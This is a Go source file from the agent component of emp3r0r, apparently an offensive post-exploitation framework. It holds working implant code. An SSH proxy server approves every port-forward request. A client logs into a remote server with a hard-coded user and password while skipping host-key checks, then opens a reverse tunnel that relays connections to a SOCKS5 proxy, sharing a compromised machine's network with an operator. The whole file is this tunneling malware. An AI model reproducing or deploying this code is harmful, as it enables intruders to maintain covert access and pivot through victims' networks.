package agent

import (
	"context"
	"fmt"
	"io"
	"log"
	"net"
	"strconv"
	"time"

	gliderssh "github.com/gliderlabs/ssh"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"golang.org/x/crypto/ssh"
)

var ReverseConns = make(map[string]context.CancelFunc) // remember reverse proxies

func SSHProxyServer(port string) (err error) {
	log.Printf("starting ssh proxy server on port %s...", port)
	forwardHandler := &gliderssh.ForwardedTCPHandler{}

	server := gliderssh.Server{
		LocalPortForwardingCallback: gliderssh.LocalPortForwardingCallback(func(ctx gliderssh.Context, dhost string, dport uint32) bool {
			log.Println("Accepted forward", dhost, dport)
			return true
		}),
		Addr: ":" + port,
		Handler: gliderssh.Handler(func(s gliderssh.Session) {
			// io.WriteString(s, "Remote forwarding available...\n")
			select {}
		}),
		ReversePortForwardingCallback: gliderssh.ReversePortForwardingCallback(func(ctx gliderssh.Context, host string, port uint32) bool {
			log.Println("attempt to bind", host, port, "granted")
			return true
		}),
		RequestHandlers: map[string]gliderssh.RequestHandler{
			"tcpip-forward":        forwardHandler.HandleSSHRequest,
			"cancel-tcpip-forward": forwardHandler.HandleSSHRequest,
		},
	}

	return server.ListenAndServe()
}

// SSHProxyClient dial SSHProxyServer, start a reverse proxy
// serverAddr format: 127.0.0.1:22
func SSHProxyClient(serverAddr string, ctx context.Context, cancel context.CancelFunc) (err error) {
	// var hostKey ssh.PublicKey
	config := &ssh.ClientConfig{
		User: "emp3r0r",
		Auth: []ssh.AuthMethod{
			ssh.Password(OpSep),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	// the port to connect to
	p, err := strconv.Atoi(ProxyPort)
	if err != nil {
		return fmt.Errorf("WTF? ProxyPort %s: %v", ProxyPort, err)
	}
	reverseProxyPort := p + 1
	serverAddr = fmt.Sprintf("%s:%d", serverAddr, reverseProxyPort)

	// Dial your ssh server.
	conn, err := ssh.Dial("tcp", serverAddr, config)
	if err != nil {
		return fmt.Errorf("unable to connect: %v", err)
	}
	defer conn.Close()

	// Request the remote side to open port 8080 on all interfaces.
	l, err := conn.Listen("tcp", "0.0.0.0:"+ProxyPort)
	if err != nil {
		return fmt.Errorf("unable to register tcp forward: %v", err)
	}
	defer l.Close()
	defer cancel()

	hasInternet := tun.HasInternetAccess()
	isProxyOK := tun.IsProxyOK(AgentProxy)
	if !hasInternet && !isProxyOK {
		return fmt.Errorf("We dont have any internet to share")
	}
	for p, cancelfunc := range ReverseConns {
		if serverAddr == p {
			cancelfunc() // cancel existing connection
		}
	}
	ReverseConns[serverAddr] = cancel // record this connection
	toAddr := "127.0.0.1:" + ProxyPort
	if !hasInternet {
		toAddr = AgentProxy
	}

	// forward to socks5
	serveConn := func(clientConn net.Conn) {
		socksConn, err := net.Dial("tcp", toAddr)
		if err != nil {
			log.Printf("failed to connect to socks5 server: %v", err)
			return
		}
		defer socksConn.Close()
		go func() {
			defer clientConn.Close()
			_, err = io.Copy(clientConn, socksConn)
			if err != nil {
				log.Printf("clientConn <- socksConn: %v", err)
			}
		}()
		go func() {
			defer clientConn.Close()
			_, err = io.Copy(socksConn, clientConn)
			if err != nil {
				log.Printf("clientConn -> socksConn: %v", err)
			}
		}()
		for ctx.Err() == nil {
			time.Sleep(20 * time.Millisecond)
		}
	}

	for ctx.Err() == nil {
		inconn, err := l.Accept()
		if err != nil {
			log.Printf("SSHProxyClient listener: %v", err)
			time.Sleep(time.Second)
			continue
		}
		go serveConn(inconn)
	}

	return nil
}
